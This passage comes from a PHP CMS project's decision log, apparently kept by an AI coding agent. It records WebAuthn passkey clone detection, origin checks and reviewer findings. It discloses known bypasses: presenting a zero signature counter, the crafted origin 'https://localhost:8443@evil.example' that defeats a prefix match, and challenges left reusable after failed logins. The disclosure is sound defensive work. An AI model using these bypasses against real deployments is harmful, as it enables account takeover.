  - **Confirmed sound against source by the reviewers, not merely read:** no branch was lost when the CSRF guard re-indented ~60 lines of the login POST (`$result` is set on every path before the wording block reads it); the `validateCsrf()` guard has no caller that relied on the old empty/empty pass, because `Auth::login()` seeds `klytos_csrf` on both the authenticated and the 2FA-pending branches and `complete2fa()` seeds it again; `reset-password.php`'s chain still covers every case; the new `$sessionId` parameters are additive and no existing call site passes them; `session_regenerate_id( true )` still runs on both login paths, so starting the anonymous session earlier introduces no fixation; the 403 discloses nothing the previous behaviour did not; and the CSRF token never reaches a URL, a redirect or a log.
  - **Both reviewers ran without a shell and said so unprompted**, so every number in this slice was measured in the main session — and the finding that mattered was proven there too, with a `curl`.

## D-063 — Clone detection only when both counters are non-zero; the origin rule becomes one rule; the second skip-list stops matching basenames
- Date / phase: 2026-07-27 / Phase 5, Sprint 6 slice 3
- Decision: audit **NEW-42** is closed in four parts. **(a)** `TwoFactor::verifyPasskeyAssertion()` compares the presented signature counter with the stored one and refuses the assertion when the presented value does not exceed it — **but only when BOTH values are greater than zero** (see implementation note 2: this is deliberately more permissive than WebAuthn §7.2, which guards on OR) — firing a new `user.passkey_clone_detected` action with `( $userId, $credentialId, $storedCount, $presentedCount )`. **(b)** The origin rule moves into ONE private helper, `TwoFactor::originIsAcceptable()`, and both ceremonies call it; the assertion path gains the check it never had, including registration's `https://localhost[:port]` allowance, carried over verbatim. **(c)** A `strlen( $authData ) < 37` guard runs before any offset is read, matching registration's identical check. **(d)** The setup-wizard skip-list in `admin/bootstrap.php` moves off basename matching onto `klytos_admin_gate_key()`, exactly as `$preAuthScripts` did in D-058, and gains `api/webauthn-challenge.php`.
- **The `> 0` condition is the whole decision, and getting it wrong is worse than leaving the gap open.** Synced platform passkeys — iCloud Keychain, Google Password Manager, and every authenticator that exists in more than one place by design — report `signCount = 0` permanently. The obvious spelling, *"the new count must exceed the stored one"*, would therefore refuse the **second login of most authenticators in use today**: a security fix that breaks authentication, which is the trap **D-044** recorded when a CSP tidy-up would have broken 2FA. This was settled by execution rather than by argument: with the naive rule installed, **exactly one test failed and it was `testASyncedPasskeyReportingZeroForeverStillCompletesLogin`**, while both clone tests still passed. That is the shape a correct rule must have, and it is now pinned in both directions.
- **A counter regression is not proof of a clone, and the response is sized to that.** A restored authenticator backup produces the identical signal. So the product refuses that one assertion and announces it; it does **not** revoke the credential, notify the account holder, or lock the account. Anything stronger would turn a restore into a lockout, and it would be a lifecycle decision with its own test point rather than a rider here.
- **`user.passkey_clone_detected` has NO core listener, and that is stated in those words** in `docs/reference/authentication.md`, in the code beside the call, and in the audit entry — because **L-019** was recorded when "it goes to the audit log" was true of a hook and false of the system. The refusal happens with or without a subscriber; the hook is how a deployment finds out. It is pinned by a test that registers a real listener and asserts both counters arrive, driven **in-process** — over HTTP the product runs in another process, where a listener registered by the test could never be reached, which is exactly the kind of assertion that cannot fail.
- **Why the origin rule became a method instead of a second copy of four lines.** Registration validated the origin and assertion did not, and the asymmetry ran the wrong way: enrolment happens once per authenticator, assertion happens at every login. Copying the four lines would have closed the gap and left the two free to drift on the next edit — the **S-04** shape this project has already paid for once, and the same reasoning that produced `Helpers::webauthnRpId()` in D-058. Refactoring the registration call site is therefore part of the fix, not scope creep: it is what makes the symmetry structural instead of remembered.
- **It cannot lock out an existing user, and that is by construction rather than by hope.** Every stored credential was enrolled through the identical check, so an origin that passes enrolment passes assertion; one that would fail assertion could never have produced a credential. The pre-existing quirk that the allowance is `https://localhost[:port]` and not `http://` is inherited unchanged and now written down in "Known limits" rather than discovered by an operator — narrowing or widening the development allowance is a decision of its own.
- **The length guard's user-visible outcome is the WARNING, not the refusal**, which is why the test asserts the warning's absence. The path already failed closed; it did so by way of `ord( $authData[32] )` reading past the end of a 32-byte string, and that input is trivially precomputable because authenticator data begins with `sha256( rpId )` and the rpId is public. `phpunit.xml` has carried `failOnWarning="true"` since **D-054**, so the assertion is the suite's exit code. That test runs **in-process** deliberately: over HTTP the warning would be raised in the server's process and land in a log nobody reads.
- **`$currentScript` is deleted, and the exit condition was established before deleting it (L-007).** `admin/bootstrap.php`'s file-scope variables leak into every admin file that requires it, so "unused in this file" is not the same as unused. The whole tree was searched: after both skip-lists moved onto the gate key, nothing in PHP read it. Removing it is also what improved the core+admin lint baseline by one error — measured by linting the pre-slice file, not inferred.
- **One test fixture was corrected, and it is recorded because a reader would otherwise see a changed expectation.** `PasskeyLoginTest` emitted `signCount = 1` at enrolment AND `1` at every assertion — i.e. it modelled an authenticator that never increments, which is precisely the condition the counter exists to flag. Nothing noticed for two sprints because nothing compared the two. The counts are now named and distinct (`ENROLLED_COUNT = 1`, `NEXT_COUNT = 2`). **This is a fixture correction, not a loosened assertion:** the property `testAPasskeyCompletesASecondFactorLogin` asserts is unchanged, and it becomes the positive control for the incrementing case.
- Alternatives rejected (and why): **"the new count must exceed the stored one"** (the spec-naive rule — refuted by measurement above); **refusing only on a strict regression, allowing equality** (an implementation using `<` rather than `<=` passes the regression test and accepts a replayed ceremony; a separate test now separates the two); **revoking the credential on a suspected clone** (what an operator eventually wants, and it converts an authenticator restore into a permanent lockout — its own decision, its own test point); **logging the clone instead of firing an action** (the NEW-44 trap: this project has shipped a log call that wrote nothing three times, and the logging design belongs to the **NEW-32** slice); **copying the origin check into the assertion path** (closes the gap, leaves two definitions free to drift — S-04); **keeping the basename skip-list and adding `'webauthn-challenge.php'`** (smallest diff, and it cannot express an `api/` path at all: six filenames exist in both `admin/` and `admin/api/`, so the entry would exempt every file of that name — the by-omission shape D-058 removed from the sibling list).
- Supersedes: none. Closes audit **NEW-42**.
- **Implementation note 1 — four documentation examples taught a parameter this project does not have, and they were found by checking my own.** Writing the `user.passkey_clone_detected` example I copied the shape of its neighbour and wrote `klytos_add_action( 'hook', fn, 10, 4 )`. **`klytos_add_action()` and `klytos_add_filter()` both take three parameters** (`hook, callback, priority`) — there is no WordPress-style accepted-args count, because `Hooks::doAction()` passes every argument to every listener. PHP ignores extra arguments to a userland function, so the examples *ran*; they simply taught an API that does not exist. Three were pre-existing (`authentication.md` for `user.passkey_enrolled`, `ai-runtime.md`, `public-comments.md`) and one was mine. **All four are corrected**, not only mine: leaving the sibling example three paragraphs above my own saying something different would be a document contradicting itself, which is the defect **L-024** records, and shipping two mental models of one API is **L-004**. Verified afterwards that no example anywhere in `docs/` or `.claude/skills/` still passes a fourth argument.
- **Implementation note 2 — the rule that ships is NOT what the WebAuthn specification says, and the first draft of this entry cited the specification as its authority. That citation was wrong, and I wrote it.** Verified against the published text rather than recalled: §7.2 *Verifying an Authentication Assertion* guards the counter comparison with **OR** — *"If `authData.signCount` is nonzero **or** `storedSignCount` is nonzero, then run the following sub-step"* — while this slice ships **AND**. The two agree in every case but one: **stored non-zero, presented zero**, which the spec calls a cloning signal and which Klytos accepts. Stated without softening: **an attacker holding a cloned credential can bypass this check by presenting a signature counter of zero.**
  - **Why AND still ships.** It is what `docs/sprints/sprint-6.md` recorded and the user approved, and this project does not reinterpret an approved scope mid-slice. The spec's rule is also not free: the case it catches is indistinguishable from an authenticator that legitimately *stops* incrementing — a firmware reset, or a credential migrated from a hardware key into a synced store — and refusing those users from then on is **D-044**'s trap in a narrower population. The spec itself leaves the RESPONSE to the Relying Party (*"Whether the Relying Party updates `storedSignCount` in this case, or not, or fails the authentication ceremony or not, is Relying Party-specific"*) — but it does **not** leave the CONDITION to the Relying Party, so this is a divergence and is labelled as one everywhere it appears.
  - **OPEN QUESTION FOR THE USER, carried rather than decided here:** move the guard from AND to OR — i.e. treat "stored non-zero, presented zero" as a cloning signal and refuse it? It closes the bypass and is what the standard says; it can also permanently refuse a real authenticator whose counter resets, on a path where the fallback is the other 2FA methods (TOTP, recovery codes, magic link), not a lockout. Recorded in `docs/reference/authentication.md` with the full case table so the decision can be made from the evidence rather than from memory.
  - **The general shape, because it is the third time this project has been bitten by it:** a specification citation is a factual claim like any other, and I wrote one from memory into code, an audit entry and a decision before checking it. It was caught by asking what the rule does at the edges — stored non-zero, presented zero — and then reading the actual text. **L-015**'s rule (re-derive, do not quote) applies to standards, not only to this project's own records.
- **Review amendment (2026-07-27, before commit — L-015): both subagents ran in parallel on the finished diff, docs included. NEITHER returned a blocking finding — the twenty-first consecutive slice where the round still paid.** Between them they produced one correction to my own diff, two new audit findings, and one flagged item that turned out NOT to be a defect once checked.
  - **The `code-reviewer`'s one substantive item was taken, and it was an inconsistency inside my own diff.** The new length guard was written `if (strlen($authData) < 37) {` — unspaced, because I was mirroring registration's identical line — while the origin check **six lines above it in the same diff** was written spaced. A new standalone statement takes the project's recorded style (**D-053**'s amendment, reapplied in D-059 and D-061; the unspaced exception is only for arms of a pre-existing `if`/`elseif` chain, which this is not). Now `if ( strlen( $authData ) < 37 ) {`. Worth recording because `phpcs` does **not** enforce this — the reviewer noted that too, and it is exactly why the convention needs a reader rather than a tool.
  - **NEW-53 (from the `security-auditor`): the localhost origin allowance is a prefix match**, so `https://localhost:8443@evil.example` — userinfo, host `evil.example` — and `https://localhost:8443/path` satisfy it. Recorded, not fixed: it is **pre-existing** and tightening it changes the registration path, outside this slice's four items (D-031). The boundary is **pinned by a test that asserts the loose behaviour on purpose**, the D-044 `style-src` precedent, so a later tightening reads as a deliberate inverted assertion instead of a mystery failure. I had reached the same conclusion independently while proving the refactor, which is the useful part: two routes to one finding.
  - **NEW-54 (from the `security-auditor`): a FAILED assertion does not consume its challenge** — `deleteWebAuthnChallenge()` is on the success path only, so all 12 `return false` branches leave it live for up to 300 s. Verified against source before recording (12 branches, one deletion). Pre-existing — but **this slice created the first refusal that happens AFTER a valid signature**, which is the only case where the window is reachable at all, so the entry is written now rather than left implicit.
  - **One flagged item was checked and is NOT a security defect, and saying so is the point (L-013).** The auditor noticed `$opensslAlgo = $algorithm === -257 ? OPENSSL_ALGO_SHA256 : OPENSSL_ALGO_SHA256;` — both ternary branches identical, so the declared COSE algorithm is ignored. It reads like an algorithm-confusion bug. It is not: `coseKeyToPem()` returns a PEM **only** for `(kty 2, alg -7)` ES256 and `(kty 3, alg -257)` RS256 and `null` for everything else, and the caller refuses on `null` before this line — and SHA-256 is the correct digest for **both** of those algorithms. So the ternary is dead code that happens to be right, not a hole. Recorded as redundant-and-harmless with the reason, rather than either "fixed" in a slice that does not own it or repeated as a finding it is not.
  - **The `code-reviewer`'s unguarded-`doAction` note was NOT taken, with the reason.** `klytos_do_action( 'user.passkey_clone_detected', … )` has no `try`/`catch`, and `Hooks::doAction()` has no per-listener guard, so a throwing plugin listener would escape `verifyPasskeyAssertion()`. That is the shape D-058's review called BLOCKING for `user.passkey_enrolled` — but there the failure **misreported a persisted success**, whereas here the security property (the login is not completed) holds either way, there is deliberately no core listener, and it is the same unguarded dispatch as the other 363 `doAction()` call sites. Wrapping this one call would be a local answer to a project-wide contract question, which is the by-omission shape this project keeps closing centrally instead.
  - **Both reviewers ran without a shell and said so unprompted**, so every number in this slice was measured in the main session. The `code-reviewer` explicitly flagged the one axis it could not close: whether `originIsAcceptable()` is byte-for-byte equivalent to the pre-refactor inline expression, since it could not run `git diff`. **That gap was closed by execution rather than left open** — the old expression and the new helper were run against 63 origin/rpId combinations and produced **zero** behaviour differences, which is also what makes NEW-53 provably pre-existing rather than something this slice introduced.
  - **Confirmed sound against source by the reviewers, not merely read:** the clone check sits after `openssl_verify()`, so a forged assertion can neither spam the hook nor advance the stored counter; `<=` (not `<`) correctly refuses a repeated counter as well as a regression; a missing or non-integer `sign_count` degrades to 0 rather than crashing or wrongly refusing; **37 is exactly the minimum for the three offsets the method reads** (0–31, 32, 33–36) with no off-by-one; the new wizard condition is fail-closed in the same direction as the code it replaces and `$currentSurface` is assigned on every path that reaches it; `$currentScript` has zero remaining PHP references repo-wide; the new tests differentiate real boundaries and the refusal tests additionally prove the session never reaches the dashboard; the ordered list of checks in `docs/reference/authentication.md` matches the code's actual order; the INDEX row matches the real call signature; and the slice introduces no new user-facing string, so the 20-catalogue rule does not apply.
  - **One false alarm the auditor raised and resolved itself, recorded so the next reader does not re-raise it:** several documents still say `verifyPasskeyAssertion()` "has zero call sites". They describe the state at the moment NEW-09 was found and are followed by their own CLOSED resolution text — the project's "original entry follows, unchanged" convention, not an L-002 defect.
